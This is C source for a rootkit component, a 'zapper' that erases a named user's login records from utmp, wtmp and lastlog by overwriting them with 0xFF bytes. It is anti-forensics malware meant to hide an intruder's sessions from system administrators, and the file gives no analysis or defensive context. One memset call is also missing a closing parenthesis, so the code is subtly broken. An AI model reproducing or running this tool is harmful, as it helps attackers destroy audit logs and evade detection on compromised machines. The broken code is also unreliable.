#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>

#include "rootkitutil.h"

#define RK_USER		argv[1]
#define RK_UTMP		_PATH_UTMP
#define RK_WTMP		_PATH_WTMP
#define RK_LASTLOG	_PATH_LASTLOG

#define GET_UID(a)	getpwnam(a)->pw_uid

/* Cleaned up for the FreeBSD rootkit */

kill_lastlog(uid_t u)
{
	struct lastlog newll;
	int fd;

	if((fd=open(RK_LASTLOG,O_RDWR))<0)
		ERR("open")

	lseek(fd,u*sizeof(struct lastlog),SEEK_SET);
	memset(&newll,0xFF,sizeof(newll));
	if(write(fd,&newll,sizeof(newll))<0)
		ERR("write")

	close(fd);
}  

kill_tmp(char *name,char *who)
{
	int f;
	struct utmp utmp_ent;

	if((f=open(name,O_RDWR))<0) 
		ERR("open")

	while(read(f,&utmp_ent,sizeof(utmp_ent))>0)
		if(!strncmp(utmp_ent.ut_name,who,strlen(who))) {
			memset(&utmp_ent,0xFF,sizeof(utmp_ent)
			lseek(f,-(sizeof(utmp_ent)),SEEK_CUR);
			if(write(f,&utmp_ent,sizeof(utmp_ent))<0)
				ERR("write")
		}

	close(f);
}

main(int argc,char **argv)
{
	BASENAME(argv[0])

	if(argc!=2)
		USAGE("username")

	kill_tmp(RK_UTMP,RK_USER);
	kill_tmp(RK_WTMP,RK_USER);
	kill_lastlog(GET_UID(RK_USER));
        printf("Zapped %s from %s and %s.\n",RK_USER,RK_UTMP,RK_WTMP);
}
